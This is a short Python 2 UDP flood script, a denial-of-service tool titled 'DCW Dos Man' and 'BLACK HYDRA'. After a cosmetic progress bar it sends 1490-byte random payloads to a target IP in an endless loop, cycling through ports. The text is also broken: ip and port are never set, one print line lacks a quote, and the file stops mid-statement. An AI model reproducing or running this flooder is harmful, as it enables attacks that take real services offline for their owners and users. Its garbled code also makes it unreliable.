import sys
import os
import time
import socket
import random
#code time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##############

os.system("clear")
os.system("figlet DCW Dos Man")
print "[+]--                    [+] 0% "
time.sleep(2)
print "[+]-xxxx>                [+] 25%"
time.sleep(2)
print "[+]-xxxxxxx>             [+] 50%"
time.sleep(3)
print "[+]-xxxxxxxxx>           [+] 75%"
time.sleep(2) 
print "[+]-xxxxxxxxxxxxxx>     [+]100%"
time.sleep(2)
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print BLACK HYDRA :-Sent %s packet to %s through port:%s"%(sent,ip,port)
    if port == 65534 
